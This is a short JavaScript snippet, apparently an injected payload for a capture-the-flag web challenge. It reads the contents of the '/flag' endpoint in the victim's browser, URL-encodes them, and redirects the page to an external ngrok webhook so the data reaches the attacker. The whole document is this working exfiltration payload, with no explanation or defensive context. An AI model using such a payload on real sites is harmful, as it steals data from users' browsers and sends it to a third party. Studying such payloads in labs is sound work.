async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/flag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://2a17-124-123-107-22.in.ngrok.io');
